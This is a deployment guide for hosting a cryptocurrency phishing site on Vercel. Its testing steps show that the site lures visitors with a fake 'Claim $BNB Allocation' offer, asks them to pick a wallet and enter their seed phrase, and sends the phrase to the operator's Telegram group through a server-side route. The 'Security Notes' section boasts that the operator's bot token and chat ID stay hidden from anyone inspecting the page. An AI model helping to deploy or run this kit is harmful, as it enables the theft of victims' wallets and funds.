# Deployment Guide - Vercel

## Quick Setup Steps

### 1. Push to GitHub
```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin your-repo-url
git push -u origin main
```

### 2. Deploy to Vercel

**Option A: Via Vercel Dashboard (Recommended)**
1. Go to [vercel.com](https://vercel.com)
2. Sign in with GitHub
3. Click **"Add New Project"**
4. Import your GitHub repository
5. Click **"Deploy"**

**Option B: Via Vercel CLI**
```bash
npm i -g vercel
vercel login
vercel
```

### 3. Add Environment Variables in Vercel

1. In your Vercel project dashboard, go to **Settings** → **Environment Variables**
2. Add the following:

   **Variable 1:**
   - **Name:** `TELEGRAM_BOT_TOKEN`
   - **Value:** `Your Telegram BOT`
   - **Environment:** Select all (Production, Preview, Development)

   **Variable 2:**
   - **Name:** `TELEGRAM_CHAT_ID`
   - **Value:** `Your Chat ID`
   - **Environment:** Select all (Production, Preview, Development)

3. Click **"Save"**

### 4. Redeploy

After adding environment variables, you need to redeploy:
- Click **"Deployments"** tab
- Click the **"⋯"** menu on the latest deployment
- Select **"Redeploy"**

## Security Notes

✅ **Credentials are secure:**
- Credentials are stored as environment variables in Vercel
- They are **never** exposed in client-side code
- Even with inspect element, the credentials remain hidden
- All Telegram API calls happen server-side

## Testing

After deployment, test the form submission:
1. Open your deployed site
2. Click "Connect Wallet" or "Claim $BNB Allocation"
3. Select a wallet and enter a test seed phrase
4. Click "Continue"
5. Check your Telegram group for the message

## Local Development

To test locally with environment variables:

1. Install Vercel CLI:
   ```bash
   npm i -g vercel
   ```

2. Create `.env.local` file:
   ```
   TELEGRAM_BOT_TOKEN=Telegram Bot Token
   TELEGRAM_CHAT_ID=Telegram Chat ID
   ```

3. Run local dev server:
   ```bash
   vercel dev
   ```

4. Open `http://localhost:3000`

## Troubleshooting

- **API route not found:** Make sure `api/telegram.js` is in the root directory
- **Environment variables not working:** Redeploy after adding variables
- **Telegram not receiving messages:** Check bot token and chat ID are correct

